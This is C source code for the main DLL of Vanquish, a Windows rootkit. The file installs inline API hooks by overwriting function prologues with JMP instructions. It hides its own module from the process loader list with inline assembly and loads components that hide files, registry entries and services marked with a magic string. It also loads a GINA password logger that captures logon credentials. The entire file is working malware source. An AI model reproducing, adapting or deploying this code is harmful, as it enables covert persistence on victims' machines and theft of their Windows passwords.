/******************************************************************************\

	Vanquish DLL - Copyright (c)2003-2005 XShadow, All rights reserved.

	This program is free software; you can redistribute it but not modify
	it under the terms of license.txt file that came with this package

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
	license for more details.

\******************************************************************************/

#include "Vanquish_dll.h"
#include "..\Injector.h"
#include "..\Utils.h"
#include <stdio.h>

//module declarations
DECLARE_VANQUISH_MODULES

#ifdef VANQUISH_DLLUTILS
#include "vDllUtils.h"
EXTERN_DLLUTILS
#endif//VANQUISH_DLLUTILS

#ifdef VANQUISH_HIDEFILES
#include "vHideFiles.h"
EXTERN_HIDEFILES
#endif//VANQUISH_HIDEFILES

#ifdef VANQUISH_HIDEREG
#include "vHideReg.h"
EXTERN_HIDEREG
#endif//VANQUISH_HIDEREG

#ifdef VANQUISH_HIDESERVICES
#include "vHideServices.h"
EXTERN_HIDESERVICES
#endif//VANQUISH_HIDESERVICES

#ifdef VANQUISH_PWDLOG
#include "vPwdLog.h"
EXTERN_PWDLOG
#endif//VANQUISH_PWDLOG

#ifdef VANQUISH_SOURCEPROTECT
#include "vSourceProtect.h"
EXTERN_SOURCEPROTECT
#endif//VANQUISH_SOURCEPROTECT

//string to search for in pos0 & posw0
//it is the magic string that hides files & registry entries
LPCSTR HIDE_STRA = "vanquish";
LPCWSTR HIDE_STRW = L"vanquish";
const DWORD HIDE_STRCN = 8;

//DLL / thread sync things...
BOOL bUnloading;
WORD nLangID;
HMODULE hVanquishModule;
CRITICAL_SECTION csVanquish;

BOOL WINAPI __Entry_DllMain(HANDLE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);

////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////

//////////////////////////////MAGIC STRING FINDING//////////////////////////////

DWORD posw0(LPCWSTR str1)
{
	LPWSTR cp = (LPWSTR)str1;
	LPWSTR s1, s2;

	if (str1 == NULL) return MAXDWORD;
	//here we should use strlen(str1) but it's faster this way
	if (IsBadReadPtr(str1, HIDE_STRCN)) return MAXDWORD;

	while (*cp)
	{
		s1 = cp;
		s2 = (LPWSTR)HIDE_STRW;

		while (*s1 && *s2 && !(CharUpperW((LPWSTR)*s1) - CharUpperW((LPWSTR)*s2)))
				s1++, s2++;

		if (!*s2) return (DWORD)(cp - str1);

		cp++;
	}

	return MAXDWORD;
}

DWORD pos0(LPCSTR str1)
{
	LPSTR cp = (LPSTR)str1;
	LPSTR s1, s2;

	if (str1 == NULL) return MAXDWORD;
	//here we should use strlen(str1) but it's faster this way
	if (IsBadReadPtr(str1, HIDE_STRCN)) return MAXDWORD;

	while (*cp)
	{
		s1 = cp;
		s2 = (LPSTR)HIDE_STRA;

		while (*s1 && *s2 && !(CharUpperA((LPSTR)*s1) - CharUpperA((LPSTR)*s2)))
				s1++, s2++;

		if (!*s2) return (DWORD)(cp - str1);

		cp++;
	}

	return MAXDWORD;
}

////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////


///////////////////////////////API REPLACEMENT//////////////////////////////////

//replace da api
BOOL Vanquish_ReplaceAPI(LPVOID lpOld, LPVOID lpNew, LPBYTE savbuf, LPBYTE hooker, DWORD dwInitial)
{
	BOOL bSuccess = FALSE;

	DWORD dwOldProtect, dwNewProtect, dwActual;

	//unloading? no replacement then
	if (bUnloading == TRUE) return TRUE;

	//some checks: here we use direct return, not goto cleanup!
	if (!lpOld) return FALSE;
	if (!lpNew) return FALSE;
	if (!savbuf) return FALSE;
	if (!hooker) return FALSE;

	EnterCriticalSection(&csVanquish);
	//modify api access rights
	dwNewProtect = PAGE_EXECUTE_READWRITE;
	dwOldProtect = dwNewProtect;
	if (!VirtualProtect(lpOld, JMP_SIZE, dwNewProtect, &dwOldProtect)) goto cleanup;

	if (dwInitial)
	{
		//save overwritten instructions
		if (IsBadReadPtr(lpOld, JMP_SIZE)) goto cleanup;
		if (IsBadWritePtr(savbuf, JMP_SIZE)) goto cleanup;
		VRTCopyMemory(savbuf, lpOld, JMP_SIZE);

		//compute relative jump offset
		dwActual = (DWORD)lpNew - (DWORD)lpOld - JMP_SIZE;
		hooker[0] = 0xe9; //relative 32-bit jmp instruction; address follows
		hooker[1] = (BYTE)(dwActual & 0xff);
		hooker[2] = (BYTE)((dwActual >> 8) & 0xff);
		hooker[3] = (BYTE)((dwActual >> 16) & 0xff);
		hooker[4] = (BYTE)((dwActual >> 24) & 0xff);
	}

	//write hooker
	if (IsBadWritePtr(lpOld, JMP_SIZE)) goto cleanup;
	VRTCopyMemory(lpOld, hooker, JMP_SIZE);

	bSuccess = TRUE;

cleanup:

	if (!bSuccess) VRTWriteLog(FALSE, 0, NULL, "Replace API failed!\r\n");

	//restore api access rights
	if (dwOldProtect != dwNewProtect) VirtualProtect(lpOld, JMP_SIZE, dwOldProtect, &dwNewProtect);
	LeaveCriticalSection(&csVanquish);

	//update instruction cache for MP systems only!
	FlushInstructionCache(GetCurrentProcess(), lpOld, JMP_SIZE);
	return bSuccess;
}

//restore it!
BOOL Vanquish_RestoreAPI(LPVOID lpOld, LPVOID lpNew, LPBYTE savbuf)
{
	BOOL bSuccess = FALSE;

	DWORD dwOldProtect, dwNewProtect;

	//some checks: here we use direct return, not goto cleanup!
	if (!lpOld) return FALSE;
	if (!lpNew) return FALSE;
	if (!savbuf) return FALSE;

	EnterCriticalSection(&csVanquish);
	//modify api access rights
	dwNewProtect = PAGE_EXECUTE_READWRITE;
	dwOldProtect = dwNewProtect;
	if (!VirtualProtect(lpOld, JMP_SIZE, dwNewProtect, &dwOldProtect)) goto cleanup;

	//write old instructions
	if (IsBadWritePtr(lpOld, JMP_SIZE)) goto cleanup;
	if (IsBadReadPtr(savbuf, JMP_SIZE)) goto cleanup;
	VRTCopyMemory(lpOld, savbuf, JMP_SIZE);

	bSuccess = TRUE;

cleanup:

	if (!bSuccess) VRTWriteLog(FALSE, 0, NULL, "Restore API failed! Application crash imminent...\r\n");

	//restore api access rights
	if (dwOldProtect != dwNewProtect) VirtualProtect(lpOld, JMP_SIZE, dwOldProtect, &dwNewProtect);
	LeaveCriticalSection(&csVanquish);

	//update instruction cache for MP systems only!
	FlushInstructionCache(GetCurrentProcess(), lpOld, JMP_SIZE);
	return bSuccess;
}

//hide a loaded module :)  --- probably works only under XP
void VanquishHideModule(DWORD dwAddress)
{
	__asm mov ecx, [dwAddress]

	//inspired from kernel32
	__asm mov eax, fs:[0x18] //goto Thread Information Block
	__asm mov eax, [eax + 0x30] //goto Process Database
	__asm mov eax, [eax + 0xc] //don't know; this is how kernel32 does it
	__asm add eax, 0xc //don't know; this is how kernel32 does it
	__asm mov esi, [eax] //don't know; this is how kernel32 does it

compare:
	__asm cmp esi, eax //check if we passed through the end
	__asm je cleanup
	__asm cmp ecx, [esi + 0x18] //check if we got the right block
	__asm je done
	__asm mov esi, [esi] //next!
	__asm jmp compare
done:
	__asm movzx edi, [esi + 0x24] //edi = size of module string in bytes
	__asm inc edi
	__asm inc edi //trailing null (we are in UNICODE == 2bytes)

	//at this point
	//    1)module path string resides in [esi + 0x28]
	//    2)edi = size of module path string in bytes
	//    3)module address resides in [esi + 0x18] just begging to be modified
	//we can unlink module if we remember the last esi in e.g. edx and we do a [edx] <- [esi] (two movs);
	//my aproach is to clear the module name wich is a paranoid one (if it doesn't know who we are and where we are then what can it do to us?)
///////////////////////////////////////////////////////////
	LPWSTR lpFile;
	DWORD dwSize;
	__asm mov ecx, [esi + 0x28]
	__asm mov [lpFile], ecx
	__asm mov [dwSize], edi

	VRTFillMemory(lpFile, dwSize, 0); //no name :)
///////////////////////////////////////////////////////////

cleanup:
	;
}

///////////////////////////////DLL SPECIFIC/////////////////////////////////////

//the DllMain thing
BOOL WINAPI __Entry_DllMain(HANDLE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	hVanquishModule = (HMODULE)hinstDLL;
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:

		bUnloading = FALSE;
		/*
		if (lpvReserved)
			return FALSE; //do not accept static loads! why? i don't know!
						  //it seems more secure this way
		*/

		//FIRST THINGS FIRST: subjective injection (SIMPLE! ISN'T IT?)
		//WARNING! disable when DEBUGing! you will find out why... :)
#ifndef _DEBUG
		if (posw0(GetCommandLineW()) != MAXDWORD) return FALSE;
#endif

		//optimize a little bit
		DisableThreadLibraryCalls(hVanquishModule);

		//oops! where is vanquish?
		VanquishHideModule((DWORD)hVanquishModule);

		//initialize Vanquish RunTime Library
		VRTInit();

		//some thread sync so the api won't get multiwritten...
		InitializeCriticalSection(&csVanquish);

		/*
		//report rebasing; FOR TESTING ONLY
		if ((DWORD)hVanquishModule != 0x01ae0000)
			VRTWriteLog(FALSE, 0, NULL, "We have been relocated to 0x%08x.\r\n", (DWORD)hVanquishModule);
		*/

		//modules need to be loaded
		//    before Vanquish_PrepareInjector() for ADDR_OF() functionality
		LOAD_VANQUISH_MODULES

		//prepare the injector
		if (!Vanquish_PrepareInjector())
			return FALSE; //we will crash windows if injector fails; so we quit

		//please note to add new entries to DllUtils also!
#ifdef VANQUISH_DLLUTILS
		LOAD_VANQUISH(DLLUTILS);
#endif//VANQUISH_DLLUTILS

#ifdef VANQUISH_HIDEFILES
		LOAD_VANQUISH(HIDEFILES);
#endif//VANQUISH_HIDEFILES

#ifdef VANQUISH_HIDEREG
		LOAD_VANQUISH(HIDEREG);
#endif//VANQUISH_HIDEREG

#ifdef VANQUISH_HIDESERVICES
		LOAD_VANQUISH(HIDESERVICES);
#endif//VANQUISH_HIDESERVICES


#ifdef VANQUISH_SOURCEPROTECT
		LOAD_VANQUISH(SOURCEPROTECT);
#endif//VANQUISH_SOURCEPROTECT

#ifdef VANQUISH_PWDLOG
		//preload gina; find out who is gina
		//LOAD_VANQUISH(PWDLOG);
		Vanquish_GetGina();
		//UNLOAD_VANQUISH(PWDLOG);

		//update modules with new gina information
		LOAD_VANQUISH_MODULES

		//load it for good
		LOAD_VANQUISH(PWDLOG);
#endif//VANQUISH_PWDLOG

/////////////////

		break;
	case DLL_PROCESS_DETACH:

		if (bUnloading) VRTWriteLog(FALSE, 0, NULL, "Detaching Vanquish On-Demand.\r\n");

#ifdef VANQUISH_DLLUTILS
		UNLOAD_VANQUISH(DLLUTILS);
#endif//VANQUISH_DLLUTILS

#ifdef VANQUISH_HIDEFILES
		UNLOAD_VANQUISH(HIDEFILES);
#endif//VANQUISH_HIDEFILES

#ifdef VANQUISH_HIDEREG
		UNLOAD_VANQUISH(HIDEREG);
#endif//VANQUISH_HIDEREG

#ifdef VANQUISH_HIDESERVICES
		UNLOAD_VANQUISH(HIDESERVICES);
#endif//VANQUISH_HIDESERVICES

#ifdef VANQUISH_SOURCEPROTECT
		UNLOAD_VANQUISH(SOURCEPROTECT);
#endif//VANQUISH_SOURCEPROTECT

#ifdef VANQUISH_PWDLOG
		UNLOAD_VANQUISH(PWDLOG);
#endif//VANQUISH_PWDLOG

		//bye bye!
		DeleteCriticalSection(&csVanquish);

		//VRT deinitialize
		VRTDeInit();
		break;
	}
	return TRUE;
}
